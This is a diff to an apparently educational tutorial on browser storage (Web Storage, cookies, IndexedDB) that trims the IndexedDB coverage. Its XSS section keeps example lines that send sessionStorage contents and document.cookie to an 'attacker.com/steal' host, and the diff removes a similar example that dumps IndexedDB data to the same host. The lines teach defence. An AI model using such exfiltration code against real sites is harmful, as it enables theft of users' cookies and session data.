@@ -206,82 +206,11 @@ graph TD
 
 > Use `localStorage` for **persistent client-only** prefs. Use `sessionStorage` for **per-tab ephemeral** flow state.
 
-## IndexedDB - the browser database
+## IndexedDB - the browser database (not in depth)
 
-### The problem it solves
+IndexedDB is the browser's built-in NoSQL database. It stores structured objects, is async (does not block the main thread), holds far more than 5-10 MB, and lets you query by field through indexes. Apps like Google Docs and Figma use it for offline mode.
 
-Web Storage is string-only, sync, and small. When you need megabytes of structured data, indexed queries, or offline work, you need a database in the browser.
-
-Examples: offline product catalog, queued writes while offline, cached API responses with indexes, large draft documents.
-
-<div style={{display: 'flex', justifyContent: 'center'}}>
-
-```mermaid
-graph TD
-  NEED{"Need >5MB or<br/>query by field<br/>or offline?"}
-  NEED -->|"no"| WS["Web Storage<br/>string + sync"]
-  NEED -->|"yes"| IDB["IndexedDB<br/>object store + index + async"]
-  IDB --> TX["Transaction<br/>atomic + versioned"]
-  TX --> STORE["Object store<br/>keyPath + autoIncrement"]
-  STORE --> IDX["Indexes<br/>byCategory, byDate"]
-```
-
-</div>
-
-### How it differs
-
-*   **Async and non-blocking** - every operation is a request with `onsuccess` or promise.
-*   **Structured** - stores objects, not just strings. No `JSON.stringify` needed.
-*   **Large** - typically **tens of MB to hundreds of MB**, up to quota which is a percentage of disk. Browser may evict under storage pressure unless persisted.
-*   **Transactional** - reads and writes run inside a transaction. Versioned upgrades run in `onupgradeneeded`.
-*   **Indexed** - you create indexes to query without scanning all records.
-
-### Example - open, store, query by index
-
-```js
-// 1. Open and create store + index on first run
-function openDB() {
-  return new Promise((resolve, reject) => {
-    const req = indexedDB.open("shop", 2)
-    req.onupgradeneeded = () => {
-      const db = req.result
-      if (!db.objectStoreNames.contains("products")) {
-        const store = db.createObjectStore("products", { keyPath: "id" })
-        store.createIndex("byCategory", "category", { unique: false })
-      }
-    }
-    req.onsuccess = () => resolve(req.result)
-    req.onerror = () => reject(req.error)
-  })
-}
-
-// 2. Put objects directly, no stringify
-async function saveProducts(products) {
-  const db = await openDB()
-  const tx = db.transaction("products", "readwrite")
-  for (const p of products) tx.objectStore("products").put(p)
-  await tx.done // with idb wrapper, or listen to tx.oncomplete
-}
-
-// 3. Query by index, not scan
-async function getByCategory(category) {
-  const db = await openDB()
-  return new Promise((resolve, reject) => {
-    const tx = db.transaction("products", "readonly")
-    const idx = tx.objectStore("products").index("byCategory")
-    const req = idx.getAll(category)
-    req.onsuccess = () => resolve(req.result)
-    req.onerror = () => reject(req.error)
-  })
-}
-
-await saveProducts([{id: 1, name: "Laptop", category: "tech"}, {id: 2, name: "Chair", category: "home"}])
-await getByCategory("tech") // [{id:1, ...}]
-```
-
-Wrap with a tiny promise helper like `idb` (by Jake Archibald) to avoid `onsuccess` boilerplate. The concept stays the same.
-
-> Use IndexedDB when you need **structured, large, queryable, offline** data. Do not use it for a single string flag.
+It is there when you need it, but for most interview answers the decision stays simple: small client preferences go in Web Storage, anything large, structured or offline goes in IndexedDB. The API is verbose (events and transactions), so libraries like `idb` or `Dexie.js` wrap it in promises. We do not go deeper here.
 
 ## The full comparison
 
@@ -329,7 +258,7 @@ localStorage.setItem("theme", "dark")
 sessionStorage.setItem("checkoutStep", "2")
 
 // Offline catalog - query by category without loading all
-indexedDB.open("shop") // then objectStore + index as above
+// (IndexedDB - not explored in depth here)
 ```
 
 Rules to say in an interview:
@@ -356,14 +285,7 @@ fetch("https://attacker.com/steal?s=" + encodeURIComponent(sessionStorage.getIte
 // Steal non-httpOnly cookies
 fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie))
 
-// Even IndexedDB is readable
-const req = indexedDB.open("shop")
-req.onsuccess = () => {
-  const tx = req.result.transaction("products", "readonly")
-  tx.objectStore("products").getAll().onsuccess = (e) => {
-    fetch("https://attacker.com/steal", { method: "POST", body: JSON.stringify(e.target.result) })
-  }
-}
+// IndexedDB too - even though we are not exploring it here, XSS reads it the same way
 
 // What the attacker does NOT get - httpOnly cookie is invisible to JS
 // document.cookie never contains it, localStorage does not contain it
@@ -438,9 +360,7 @@ window.addEventListener("storage", (e) => {
 
 ### IndexedDB
 
-*   Version upgrades only in `onupgradeneeded`. You cannot create a store outside it.
-*   Transactions auto-commit when event loop goes idle. Do not `await fetch()` inside a transaction without holding it.
-*   Eviction under storage pressure. Ask for persistence: `navigator.storage.persist()` and check `navigator.storage.persisted()`.
+*   Not explored here. Same rule as Web Storage: it is JS-readable, so no secrets in it. API lives behind `indexedDB.open()`.
 
 <div style={{display: 'flex', justifyContent: 'center'}}>
 
@@ -450,7 +370,7 @@ graph TD
   WHY -->|"QuotaExceededError"| FULL["Storage full<br/>or private mode<br/>fallback"]
   WHY -->|"HttpOnly"| HIDE["document.cookie<br/>hides it<br/>check DevTools"]
   WHY -->|"SameSite None<br/>without Secure"| REJECT["Browser rejects<br/>Set-Cookie"]
-  WHY -->|"IDB version<br/>outside upgrade"| VER["Create store only<br/>in onupgradeneeded"]
+  WHY -->|"Write to<br/>IndexedDB"| IDB4["Not explored<br/>in depth here"]
 ```
 
 </div>
@@ -469,15 +389,8 @@ sessionStorage.setItem("demoSession", "i die with tab")
 console.log(localStorage.getItem("demoLocal"))
 console.log(sessionStorage.getItem("demoSession"))
 
-// IndexedDB - check Application > IndexedDB
-const req = indexedDB.open("demo", 1)
-req.onupgradeneeded = () => req.result.createObjectStore("notes", { keyPath: "id" })
-req.onsuccess = () => {
-  const db = req.result
-  const tx = db.transaction("notes", "readwrite")
-  tx.objectStore("notes").put({ id: 1, text: "hello indexedDB" })
-  tx.oncomplete = () => console.log("saved")
-}
+// IndexedDB - not explored in depth here, check Application > IndexedDB
+// after any app like Google Docs writes to it
 ```
 
 ## References
